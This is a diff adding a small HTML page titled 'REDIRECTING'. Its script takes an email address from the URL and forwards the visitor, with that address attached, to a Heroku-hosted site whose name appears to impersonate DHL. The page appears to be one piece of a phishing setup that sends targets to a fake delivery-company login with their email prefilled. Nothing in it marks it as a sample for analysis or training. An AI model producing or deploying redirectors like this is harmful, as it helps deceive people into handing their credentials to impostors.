@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REDIRECTING</title>
+</head>
+<body>
+    <script>
+        
+        let url = 'https://dhl3213.herokuapp.com';
+        
+        const email = new URLSearchParams(location.search).get('email');
+        if (email){
+            url = url + '/?email='+email;
+        }
+        location.replace(url)
+    </script>
+</body>
+</html>
